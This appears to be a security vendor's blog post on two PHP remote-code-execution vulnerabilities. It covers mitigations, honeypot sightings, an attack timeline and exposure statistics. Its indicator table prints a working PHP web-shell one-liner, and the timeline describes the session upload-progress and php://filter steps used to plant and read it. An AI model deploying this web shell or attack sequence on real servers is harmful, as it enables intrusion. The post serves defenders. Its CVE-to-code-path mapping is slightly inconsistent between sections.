# extract: served via trafilatura-direct
---
title: "PHP2Shell Vulnerabilities: CVE-2026-109618 and CVE-2026-109619 | Blog | VulnCheck"
url: https://www.vulncheck.com/blog/php2shell-vulnerabilities
hostname: vulncheck.com
description: Two critical vulnerabilities in PHP, CVE-2026-109618 and CVE-2026-109619, allow for unauthenticated remote code execution.
sitename: VulnCheck
date: "2026-10-21"
fingerprint: b41e1ad7ada3f7c1
---
**VulnCheck In the Wild:** Join our research team on [October 28 at 1 PM ET](https://wwv.vulncheck.com/in-the-wild-with-vulncheck-webinar-series) for a deep dive on exploiting PHP2Shell.

News of two impending critical RCE vulnerabilities ([CVE-2026-109618](https://console.vulncheck.com/cve/CVE-2026-109618) and [CVE-2026-109619](https://console.vulncheck.com/cve/CVE-2026-109619)) in PHP prompted a huge, global overnight effort on Tuesday, October 20 when word of the vulnerabilities' existence [leaked](https://news.ycombinator.com/item?id=50167754) ahead of the planned patch release. The [PHP team confirmed](https://www.php.net/index.php#2026-10-20-1) an upcoming security release shortly after the leak occurred. Naturally, upon seeing the leaked info, ten thousand LLMs were immediately pointed at PHP source code.

On October 21, PHP [published](https://www.php.net/archive/2026.php#2026-10-21-5) vulnerability details on what the community inevitably christened "PHP2shell":

- [CVE-2026-109618](https://console.vulncheck.com/cve/CVE-2026-109618): RCE via OOM corruption (GHSA-w8hw-w9fx-j79w). Out-of-memory handling can interrupt PHP while internal request data is only partially initialized. Request cleanup may then treat the invalid data as valid.
- [CVE-2026-109619](https://console.vulncheck.com/cve/CVE-2026-109619): RCE via stale global state (GHSA-6wmf-4rv5-p3rp). Request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialization resets it.

## [VulnCheck research observations](https://www.vulncheck.com#vulncheck-research-observations)

The VulnCheck research team independently reproduced CVE-2026-109618 and CVE-2026-109619 late the evening of October 20. The team's early analysis was that the vulnerabilities can be exploited for RCE successfully on ARM64 systems and x86 systems without ASLR.

**VulnCheck exploit availability:** As of 1:30 AM ET on Thursday, October 22, the VulnCheck team had a weaponized exploit for CVE-2026-109618 available to Initial Access Intelligence customers, along with a dozen+ network rules. Our initial exploit leveraged a VulnCheck-discovered memory leak chained into RCE on PHP 8.4.26 on x86-64 platforms with ASLR enabled and `display_errors=off`, the recommended production configuration. As of 5:30 PM ET on Friday, October 23, the team's exploit supports:

- PHP 8.4.10 through 8.4.26 on AMD64 and ARM64 with default settings and `display_errors=off` (`mod_php`)
- PHP 8.5.10 and 8.5.11 on AMD64 and ARM64 with default settings and `display_errors=off` (`mod_php`)
- WordPress exploitation on default Docker installs running the supported versions of PHP above

We are not aware of any other public or commercial exploit that achieves RCE on multiple versions of PHP in production configurations, though we expect that to change as adversaries and researchers develop incrementally more sophisticated attacks.

Hundreds of proof-of-concept repos have flooded GitHub, which our team is reviewing as they come in. Only a very small number have been legitimate exploits, but as of 7 PM ET on October 22, we've identified at least [one PoC](https://github.com/9bie/php2shell-bypass-aslr-exp/blob/main/archive/legacy-8m/ASLR_PATHS.md) that successfully bypassed ASLR on x86-64 systems for a single version of PHP (8.4.26) with default heap configurations. In our team's testing, the PoC did not work outside of this specific setup.

We expect to continue seeing widespread exploit attempts with public PoCs, irrespective of whether the PoC code is functional or the target is exploitable. VulnCheck-reviewed GitHub exploits are available to the community in our [XDB](https://www.vulncheck.com/xdb).

## [Mitigation guidance](https://www.vulncheck.com#mitigation-guidance)

The fixed versions are PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35. PHP 8.1 and older no longer receive supplier-provided patches. PHP's suggested mitigations for those who cannot apply patches immediately are in the [advisory](https://www.php.net/archive/2026.php#2026-10-21-5) and reproduced below:

### [RCE via OOM corruption (CVE-2026-109618)](https://www.vulncheck.com#rce-via-oom-corruption-cve-2026-109618)

Set memory\_limit=-1, preferably in a way applications can't override, such as php\_admin\_value in the FPM pool or Apache configuration, and check that no pool, directory or application setting puts a finite limit back. This removes the controllable PHP memory limit failure, but an underlying allocation failure can still reach the vulnerable path.

Set a low post\_max\_size. For applications that don't require file uploads, set post\_max\_size = 8M. If file uploads are necessary, set post\_max\_size = 32M. Keep upload\_max\_filesize below post\_max\_size. Consider enforcing limits at the web server or proxy level for decoded request size, input field count, multipart part count, header count, and nesting depth. These limits must also cover requests without a usable Content-Length.

Use a container or cgroup limit as an availability boundary, preferably with a policy that kills only the affected worker. Do not substitute RLIMIT\_AS or RLIMIT\_DATA, as these can cause the vulnerable allocation failure.

### [RCE via stale global state (CVE-2026-109619)](https://www.vulncheck.com#rce-via-stale-global-state-cve-2026-109619)

Set session.upload\_progress.enabled=0 and restart every worker. Use php.ini, an FPM pool or server configuration that applies before request parsing. Do not rely on ini\_set() or FPM .user.ini. This blocks the confirmed session paths but not other variants.

On PHP 8.5, set fatal\_error\_backtraces=0 and restart every worker. This blocks the confirmed fatal backtrace path only. Remove invalid or deprecated settings applied per request that emit diagnostics before initialization. Hiding diagnostics with error\_reporting, display\_errors or @ does not help.

Fix attacker-reachable fatal errors and execution timeouts, including failures in callbacks, upload or import processing and cleanup.

## [VulnCheck Canary Observations](https://www.vulncheck.com#vulncheck-canary-observations)

VulnCheck [Canary Intelligence](https://www.vulncheck.com/product/canary-intelligence) recorded early behavior from two source IPs with the user-agent `php2shell-scan/109618`, which sent multipart file upload requests to `index.php` on hosts in several cloud regions and providers. The behavior observed appears to target CVE-2026-109618, the upload-progress vulnerability, where a multipart `POST` to any PHP endpoint that is processed by `upload-progress` can cause a memory limit failure. The scanning tool indicated in the user-agent references the same CVE number and the multipart upload requests utilize the upload-progress code path. For the IP addresses sharing the user-agent, our Canary hosts say two files named `a` and `b` are uploaded, but in this case was not enough to force memory exhaustion in one request.

We’ve also observed at least one attempted exploit from a China-based IP which tried to (unsuccessfully) drop a webshell via a server-side session file. It tried to read the file back through a file disclosure path, but the path did not exist, so the attempt received a 404.

### [Timeline (UTC, October 21, 2026)](https://www.vulncheck.com#timeline-utc-october-21-2026)

| Time | Source | Targeted CVE | Activity | 
|---|---|---|---|
| 08:37 – 08:52 | 85.11.167.243 | CVE-2026-109618 | Probe: `GET /index.php`, then a multipart `POST /index.php` with UA `php2shell-scan/109618`. Sent to 9 hosts. | 
| 09:28 – 10:46 | 85.11.167.243 | none specific (reconnaissance) | Follow-up sweep: `GET /` with four rotating browser User-Agents (Chrome/Edge, IE 11, Safari, Firefox) to 58 hosts. | 
| 14:15 – 14:24 | 45.198.224.169 | CVE-2026-109618 | The same probe (UA `php2shell-scan/109618`, multipart `POST /index.php`) against 2 hosts. | 
| 14:32 – 14:37 | 45.198.224.169 | CVE-2026-109618 (likely follow-up) | Short POSTs to `/index.php` and `/`: a 13-byte body, no User-Agent. Sent to 3 hosts. | 
| 15:52 | 45.198.224.169 | — | Last connection observed. | 
| 15:55 | 109.71.252.97 | CVE-2026-109618/109619 | Probe with UA `php2shell-scan/1.3 (eigen-oppervlak controle; CVE-2026-109618/109619)` (Dutch: "own-surface check"). `GET /`, then common PHP info pages (`/phpinfo.php`, `/info.php`, `/php.php`, `/pi.php`, `/test.php`, `/i.php`), then `/php2shell-probe-<random>.php` and `.txt`. Sent to 1 host. | 
| 17:22 – 17:24 | 221.14.159.134 | CVE-2026-109618 (upload-progress path) | **Exploitation attempt**, UA `Mozilla/5.0 (php2shell-poc)`. A multipart `POST /index.php` plants a web shell through `PHP_SESSION_UPLOAD_PROGRESS`, and 10 `GET /download.php?file=php://filter/...` requests try to read the resulting session file. All reads returned 404. See below. | 
| 17:23 | 91.90.123.25 | CVE-2026-109618 | Check with UA `php2shell-verify/1.0`: `GET /vuln.php` (404), `GET /index.php`, `POST /`. Sent to 1 host. | 

In total, 85.11.167.243 connected to 188 canary hosts while 45.198.224.169 connected to 26. Three later sources each touched one host.

### [Indicators of compromise](https://www.vulncheck.com#indicators-of-compromise)

#### [Network](https://www.vulncheck.com#network)

| Indicator | Type | Network | CVE | First seen (UTC) | Last seen (UTC) | Use it to | Expected shelf life | 
|---|---|---|---|---|---|---|---|
| `85.11.167.243` | IPv4 | AS209630 TechTies Inc. (85.11.167.0/24, NL) | CVE-2026-109618 | 2026-10-21 08:37 | 2026-10-21 10:46 | Block; hunt in logs | Days. Hosting IPs rotate. | 
| `45.198.224.169` | IPv4 | AS215925 VPSVAULT.HOST LTD | CVE-2026-109618 | 2026-10-21 14:15 | 2026-10-21 15:52 | Block; hunt in logs | Days. Hosting IPs rotate. | 
| `109.71.252.97` | IPv4 | Datalix (AS58087 / AS213250, DE) | CVE-2026-109618/109619 | 2026-10-21 15:55 | 2026-10-21 15:55 | Block; hunt in logs | Days. Hosting IPs rotate. | 
| `221.14.159.134` | IPv4 | AS4837 China Unicom (Henan, CN) | CVE-2026-109618 (exploitation attempt) | 2026-10-21 17:22 | 2026-10-21 17:24 | Block; hunt in logs; **check for follow-up requests** | Days to weeks. Residential/ISP address. | 
| `91.90.123.25` | IPv4 | AS9009 M247 Ltd (Brussels, BE) | CVE-2026-109618 | 2026-10-21 17:23 | 2026-10-21 17:23 | Block; hunt in logs | Days. Hosting IPs rotate. | 
| `php2shell-scan/109618` | HTTP User-Agent | — | CVE-2026-109618 | 2026-10-21 08:37 | 2026-10-21 14:24 | Alert in WAF/IDS; hunt in logs | Until the tool changes it. Trivial to change. | 
| `php2shell-scan/1.3 (eigen-oppervlak controle; CVE-2026-109618/109619)` | HTTP User-Agent | — | CVE-2026-109618/109619 | 2026-10-21 15:55 | 2026-10-21 15:55 | Alert in WAF/IDS; hunt in logs | Trivial to change. | 
| `php2shell-verify/1.0` | HTTP User-Agent | — | CVE-2026-109618 | 2026-10-21 17:23 | 2026-10-21 17:23 | Alert in WAF/IDS; hunt in logs | Trivial to change. | 
| `Mozilla/5.0 (php2shell-poc)` | HTTP User-Agent | — | CVE-2026-109618 (exploitation attempt) | 2026-10-21 17:22 | 2026-10-21 17:24 | Alert in WAF/IDS; hunt in logs | Trivial to change. | 
| `xqsuvwz3n97wu8j3emz1axuo5y` | PHPSESSID value / session filename `sess_xqsuvwz3n97wu8j3emz1axuo5y` | — | CVE-2026-109618 (exploitation attempt) | 2026-10-21 17:22 | 2026-10-21 17:24 | Search request logs, and session directories for the file | Per-run value; may be hard-coded in the tool. | 
| `------p2s9rdme2st6guc9g0rafic` / `p2s.txt` | Multipart boundary / upload filename | — | CVE-2026-109618 (exploitation attempt) | 2026-10-21 17:22 | 2026-10-21 17:24 | Match in WAF/IDS request-body logs | Unknown; possibly hard-coded. | 
| `<?php echo 'PWNED::'; system($_GET['c']); ?>` | Web shell planted via `PHP_SESSION_UPLOAD_PROGRESS` | — | CVE-2026-109618 (exploitation attempt) | 2026-10-21 17:22 | 2026-10-21 17:24 | Search session files and request-body logs; `PWNED::` in any response means it ran | Trivial to change. | 

#### [Uploaded content (SHA-256)](https://www.vulncheck.com#uploaded-content-sha-256)

| File part | Size (bytes) | SHA-256 | Seen from | 
|---|---|---|---|
| a | 10,370 | 150ae88f0999032e2a6113501d6082f54a3ed98d02427b21a96e773a27d7bf16 | both sources | 
| a | 8,922 | 40caf199ca1ebe056a74427f8e9db06c66899e33ae09c0ec2769ec70bf6dd8e7 | 45.198.224.169 | 
| b | 64 | 27d926a6708d6769d97d065e7a5a860ab496eab272c03d1cebc55ec71b954fa2 | both sources | 
| request body | 13 | 1485e14e0f62bc94664eec341cabd275dad7d30b1d496c40ec340c9a0d9f0ba8 | 45.198.224.169 (follow-up POSTs) | 

## [PHP on the internet: VulnCheck Target Intel observations](https://www.vulncheck.com#php-on-the-internet-vulncheck-target-intel-observations)

VulnCheck [Target Intelligence](https://www.vulncheck.com/product/target-intelligence) has identified PHP on 2,608,039 internet-facing hosts. That is 1.86% of the roughly 140 million IP addresses we saw responding on web protocols in the last 30 days. Based on the version information visible to us, we believe 2,607,985 of them (99.998%) are vulnerable or likely vulnerable to PHP2Shell.

The internet-facing target population splits fairly evenly:

- 1,474,985 hosts (56.56%) advertise a PHP version below the fixed build for their branch.
- 1,133,000 hosts (43.44%) run PHP but don't expose a version. We're treating these as versionless and are likely vulnerable, given how recent the CVE is. The fixed releases are only hours old, so there’s little reason to assume otherwise.

Patching has already started, if slowly. We see patching is beginning with some hosts on a fixed build (8.5.12, 8.4.27, 8.3.36 or 8.2.35).

Notably, a large share of the vulnerable population is on branches that PHP no longer supports:

- 700,000+ hosts (27% of PHP hosts) run PHP 3.x through 7.3. These branches are end-of-life and won't receive a fix. PHP 7.4.33, the final 7.x release and still the single most common version we see, is on 172,000+ hosts.
- Just under 400,000 hosts (15%) run PHP 7.4, 8.0 or 8.1. These are also end-of-life. The PHP security team has published source backports for them, but no new release, so they stay x exposed until someone rebuilds PHP by hand.

Taken together, 1.1 million+ hosts, about 42% of everything running PHP, are on end-of-life branches with no official patched release. For comparison, 403,000 hosts sit on the supported 8.2 through 8.5 branches and can upgrade more simply.

### [How PHP was found](https://www.vulncheck.com#how-php-was-found)

Most of these hosts tell us they run PHP. 2,146,053 hosts (82%) identify it directly in their HTTP responses, typically through the X-Powered-By header or a cookie. The other 462,000 hosts (17.71%) never mention it because they run an application built on it.

Across the roughly 106 million hosts we see serving HTTP, PHP appears on 2.45%. Hosts that identify PHP directly make up 2.02%, and hosts found only through an application make up another 0.43%.

### [Apps commonly associated with PHP](https://www.vulncheck.com#apps-commonly-associated-with-php)

PHP often hides behind the application on top of it. Defenders shouldn't assume a system is unaffected just because it doesn't advertise PHP. These common applications are frequently associated with PHP and are exposed if the interpreter underneath is vulnerable:

| Application | Hosts | 
|---|---|
| WordPress | 469,699 | 
| Laravel (incl. Livewire) | 124,866 | 
| Joomla | 26,591 | 
| Drupal | 24,116 | 
| Magento / Adobe Commerce | 3,735 | 
| MediaWiki | 2,116 | 
| Symfony | 2,104 | 
| phpBB | 1,391 | 
| WHMCS | 59 | 

All of these figures should be considered to be floors; we count each host once based on its most recent scan. Linux distributions often backport security fixes without changing the version string, so some hosts appearing vulnerable may not update version numbers after patching occurs.

### [About VulnCheck](https://www.vulncheck.com#about-vulncheck)

VulnCheck empowers organizations to transcend the challenges of vulnerability prioritization. Our suite of solutions provides product managers, PSIRT teams, and threat hunters with the tools required for accelerated, high-precision operations and infinite efficiency.

Recognizing the industry-wide necessity for superior data velocity and accuracy, we deliver high-fidelity insights to the market. We remain committed to surfacing critical intelligence on vulnerability exploitation and emerging trends, leveraging our unique dataset to support the practitioner community.

To deepen your understanding of these threats, [VulnCheck Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) provides comprehensive coverage of global threat actors. Register for a demo to explore our intelligence today.
